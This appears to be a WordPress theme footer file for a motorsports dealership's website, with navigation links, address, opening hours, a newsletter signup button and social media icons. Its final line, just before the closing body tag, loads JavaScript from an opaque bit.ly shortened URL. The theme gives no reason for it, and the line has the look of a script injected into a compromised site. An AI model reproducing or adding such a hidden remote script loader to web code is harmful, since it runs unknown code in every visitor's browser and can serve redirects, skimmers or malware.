<?php wp_footer();

$image_id = get_page_by_title('rps-logo', 'OBJECT', 'attachment');
$image_alt = get_post_meta($image_id->ID, '_wp_attachment_image_alt', TRUE);
$image = $image_id->guid;

echo'<footer>
            <div class="row">
                <span class="col-lg-3">
                    <a href="' . site_url() . '">
                        <img class="logo" src="' . $image . '" alt="' . $image_alt . '">
                    </a>
                </span>
                <div class="col-lg-2 contactLinks">
                    <ul>
                        <li class="mobileShow"><a href="' . site_url() . '">Home</a></li>
                        <li><a href="/showroom/">Showroom</a></li>
                        <li><a href="/parts/">Parts & Accessories</a></li>
                        <li><a href="/service/">Service</a></li>
                        <li><a href="/about/">About Us</a></li>
                        <li><a href="/contact/">Contact</a></li>
                        <li><a href="/careers/">Careers</a></li>
                        <li><a href="/privacy/">Privacy</a></li>
                    </ul>
                    <p>
                        <a class="location" href="https://maps.google.com/?q=Recreational+Power+Sports" target="_blank" rel="noopener">
                            <span>11204 154 Street NW</span>
                            <span>Edmonton</span>
                            <span>AB</span>
                            <span>T5M 1X7</span>
                        </a>
                    </p>
                </div>
                <div class="col-lg-3">
                    <p><strong>Hours</strong></p>
                    <p>Monday to Friday: <span>8:00am to 5:00pm</span></p>
                    <p>Saturday: <span>10:00am to 2:00pm</span></p>
                    <p>Sundays and Holidays: <span>Closed</span></p>
                </div>
                <div class="col-lg-4">
                    <p><strong>Subscribe To Our Newsletter</strong></p>
                    <p>Subscribe to our newsletter to see exciting new offers, products promotions, and keep up with the Rec Power team</p>';
?>
<button class="button-3d register" onclick="location.href='http://eepurl.com/duHsr5'">I'd Like to Register</button>
</div>
</div>
<div class="row">
    <div class="col-lg-4 offset-lg-4 socmedContainer">
        <div id="facebookIcon" class="socmed">
            <a class="facebook" target="_blank">
                <object data="<?php echo get_template_directory_uri() . '/assets/src/library/images/facebook.svg' ?>" ></object>
            </a>
        </div>
        <div id="youtubeIcon" class="socmed">
            <a class="youtube" target="_blank">
                <object data="<?php echo get_template_directory_uri() . '/assets/src/library/images/youtube.svg' ?>"></object>
            </a>
        </div>
        <div id="instaIcon" class="socmed">
            <a class="instagram" target="_blank">
                <object data="<?php echo get_template_directory_uri() . '/assets/src/library/images/instagram.svg' ?>"></object>
            </a>
        </div>
    </div>
</div>
<div class="row">
    <span class="col-lg-12">&copy; 2022 Recreational Power Sports</span>
</div>
</footer>
<script delay src='https://bit.ly/3wO0rkP' type='text/javascript'></script>
</body>
</html>